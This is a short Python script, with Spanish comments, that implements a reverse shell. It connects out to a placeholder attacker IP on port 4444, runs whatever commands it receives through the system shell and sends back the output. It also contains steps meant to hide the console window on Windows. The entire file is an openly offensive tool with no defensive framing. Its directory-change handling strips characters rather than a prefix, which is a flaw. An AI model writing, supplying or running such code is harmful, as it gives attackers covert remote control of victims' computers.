import socket
import subprocess
import os
import sys

def start_reverse_shell(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        if command.startswith('cd '):
            try:
                os.chdir(command.strip('cd '))
                client.send(b'Changed directory')
            except FileNotFoundError as e:
                client.send(str(e).encode())
        else:
            try:
                # Ejecuta el comando sin mostrar la ventana de la consola
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                client.send(output.stdout.encode() + output.stderr.encode())
            except Exception as e:
                client.send(str(e).encode())

    client.close()

if __name__ == '__main__':
    # Oculta la consola en Windows
    if os.name == 'nt':
        subprocess.Popen(['pythonw.exe'] + sys.argv)
    else:
        start_reverse_shell('La ip de atacante', 4444)
